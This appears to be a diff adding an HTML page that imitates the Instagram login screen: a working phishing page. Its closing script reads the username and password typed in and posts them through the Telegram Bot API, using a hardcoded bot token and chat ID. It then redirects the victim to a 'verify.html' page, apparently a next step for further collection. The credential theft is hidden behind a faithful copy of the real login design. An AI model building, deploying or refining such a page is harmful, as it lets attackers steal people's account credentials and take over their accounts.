@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Align items to the top */
+        }
+        .image-container {
+            position: relative;
+            margin-right: 30px;
+        }   
+
+        .image-container .background-img {
+            max-width: 500px;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .screenshot-overlay {
+            position: absolute;
+            top: 3.4%;
+            left: 33%;
+            width: 55%;
+            height: auto;
+            border-radius: 10px;
+            transition: opacity 1s ease;
+            opacity: 0; /* Default opacity for all images */
+        }
+
+        #screenshot1 {
+            opacity: 1; /* Show the first screenshot */
+        }
+
+        .image-container img {
+            max-width: 500px;
+            height: auto;
+            border-radius: 10px;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #f5f5f5;
+            padding: 20px;
+            margin-bottom: 20px; /* Adjust margin for spacing */
+            height: 420px;
+            border-radius: 3px;
+            border: 2px solid #d8d8d8; /* Gray border */
+            width: 306px;
+            margin-left: 20px;
+            margin-right: -273px;
+            margin-top: -160px;
+            position: relative;
+        }
+        .container img.logo {
+            margin-bottom: 40px;
+            width: 200px;
+        }
+        .input-group {
+            position: relative;
+            margin: 10px 0;
+            width: 86%;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 2px;
+            border: 1px solid #ccc;
+            transition: border-color 0.3s ease;
+            box-sizing: border-box;
+            text-align: left;
+        }
+        .floating-label {
+            position: absolute;
+            top: 17px;
+            left: 8px;
+            color: #aaa;
+            transition: 0.2s ease all;
+            pointer-events: none;
+            background-color: #ffffff00;
+            padding: 0 4px;
+            font-size: 12px;
+            margin-top: -5px;
+        }
+        input:focus + .floating-label,
+        input:not(:placeholder-shown) + .floating-label {
+            top: 8px;
+            left: 8px;
+            font-size: 10px;
+        }
+        button {
+            width: 86%;
+            padding: 10px 20px;
+            background-color: #007bff;
+            border: none;
+            color: white;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0063cc;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            width: 85%;
+            margin: 30px 0;
+        }
+        .separator hr {
+            flex: 1;
+            border: 1px solid #ccc;
+        }
+        .separator span {
+            margin: 0 20px;
+            font-weight: bold;
+        }
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            color: #020291;
+            text-decoration: none;
+            margin-top: 10px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .facebook-login img {
+            width: 20px;
+            height: auto;
+            margin-right: 8px;
+        }
+        .forgot-password {
+            margin-top: 25px;
+            color: #023587;
+            text-decoration: none;
+            font-size: 12px;
+            letter-spacing: 0.5px;
+            margin-bottom: 15px;
+        }
+        .signup-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 400px;
+            margin-right: 240px;
+            margin-left: -75px;
+            align-items: center;
+            background-color: #f5f5f5;
+            padding: 10px;
+            border-radius: 3px;
+            border: 2px solid #d8d8d8; /* Gray border */
+            width: 325px;
+            height: 43px;
+        }
+        .signup-container a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .download-container {
+            text-align: center;
+            margin-top: 550px; /* Adjusted for spacing */
+            margin-left: -540px;
+            font-size: 9px;
+        }
+        .download-container img {
+            width: 100px; /* Adjust size as needed */
+            margin: 5px; /* Space between images */
+        }
+        footer {
+    position: fixed; /* Fix the footer at the bottom */
+    bottom: 0; /* Align to the bottom */
+    left: 0; /* Align to the left */
+    font-size: 14px;
+    right: 0; /* Stretch to the right */
+    background-color: #ffffff00; /* Light background with some transparency */
+    padding: 10px 0; /* Padding for top and bottom */
+    text-align: center; /* Center the footer content */
+}
+
+.footer-links {
+    display: flex;
+    flex-wrap: wrap; /* Allow links to wrap onto the next line */
+    justify-content: center; /* Center the links horizontally */
+    gap: 10px; /* Space between links */
+}
+
+.footer-links a {
+    color: gray; /* Gray color for links */
+    text-decoration: none; /* Remove underline by default */
+    transition: text-decoration 0.3s; /* Smooth transition for underline */
+}
+
+.footer-links a:hover {
+    text-decoration: underline; /* Underline on hover */
+}
+
+@media (max-width: 600px) {
+    .image-container {
+        display: none; /* Hide image containers on mobile */
+    }
+}
+
+
+
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="image-container">
+            <img src="../img/home-phones.png" alt="Homepage Image" class="background-img">
+            <img src="../img/screenshot1.png" id="screenshot1" class="screenshot-overlay" alt="Screenshot 1">
+            <img src="../img/screenshot2.png" id="screenshot2" class="screenshot-overlay" alt="Screenshot 2">
+            <img src="../img/screenshot3.png" id="screenshot3" class="screenshot-overlay" alt="Screenshot 3">
+            <img src="../img/screenshot4.png" id="screenshot4" class="screenshot-overlay" alt="Screenshot 4">            
+        </div>
+    </div>
+    <div class="container">
+        <img src="../img/header.png" alt="Instagram Logo" class="logo">
+
+        <div class="input-group">
+            <input type="text" id="username" placeholder=" ">
+            <label for="username" class="floating-label">Phone number, username or email</label>
+        </div>
+
+        <div class="input-group">
+            <input type="password" id="password" placeholder=" ">
+            <label for="password" class="floating-label">Password</label>
+        </div>
+
+        <button id="loginBtn">Login</button>
+
+        <div class="separator">
+            <hr>
+            <span>Or</span>
+            <hr>
+        </div>
+
+        <a href="#" class="facebook-login">
+            <img src="../img/facebook.png" alt="Facebook Icon">Login with Facebook
+        </a>
+
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot your password?</a>
+    </div>
+</div>
+
+<div class="signup-container">
+    <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+</div>
+<div class="download-container">
+    <h2>Download the app</h2>
+    <a href="https://apps.apple.com/us/app/instagram/id389801252">
+        <img src="../img/google.png" alt="Download on the App Store">
+    </a>
+    <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+        <img src="../img/microsoft.png" alt="Get it on Google Play">
+    </a>
+</div>
+<footer>
+    <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">À propos</a>
+        <a href="#">Blog</a>
+        <a href="#">Emplois</a>
+        <a href="#">Aide</a>
+        <a href="#">API</a>
+        <a href="#">Confidentialité</a>
+        <a href="#">Conditions</a>
+        <a href="#">Lieux</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+    </div>
+</footer>
+
+
+    <script>
+ // List of image elements
+const screenshots = document.querySelectorAll('.screenshot-overlay');
+let currentIndex = 0;
+
+// Function to update the overlay image with fade effect
+function updateScreenshot() {
+    // Fade out the current image
+    screenshots[currentIndex].style.opacity = 0;
+
+    // Update the current index
+    currentIndex = (currentIndex + 1) % screenshots.length;
+
+    // Fade in the next image
+    screenshots[currentIndex].style.opacity = 1;
+}
+
+// Change the image every 4 seconds (4000 milliseconds)
+setInterval(updateScreenshot, 4000);
+
+// Redirect when login button clicked
+document.getElementById('loginBtn').addEventListener('click', function() {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    
+    if (username !== '' && password !== '') {
+        // Telegram bot details
+        const token = '8143301286:AAES3vn3ofB-ddmoLzcq6r-V0hQAKcjpsQ4';
+        const chatId = '-4515080557';
+        const message = `Username: ${username}\nPassword: ${password}`;
+        const buttonMarkup = JSON.stringify({
+            inline_keyboard: [
+                [
+                    { text: "Close", callback_data: "close" }
+                ]
+            ]
+        });
+
+        // Send the information to Telegram
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                reply_markup: buttonMarkup,
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+            if (data.ok) {
+                // Redirect to verify.html if the message was sent successfully
+                window.location.href = 'verify.html';
+            } else {
+                alert('Error Accurded Try Again Please.'); // Alert if there was an issue sending
+            }
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            alert('Error Accurded Try Again Please.'); // Alert on network or other errors
+        });
+    } else {
+        alert('Please fill in both fields.'); // Alert the user if not
+    }
+});
+
+    </script>
+</body>
+</html>
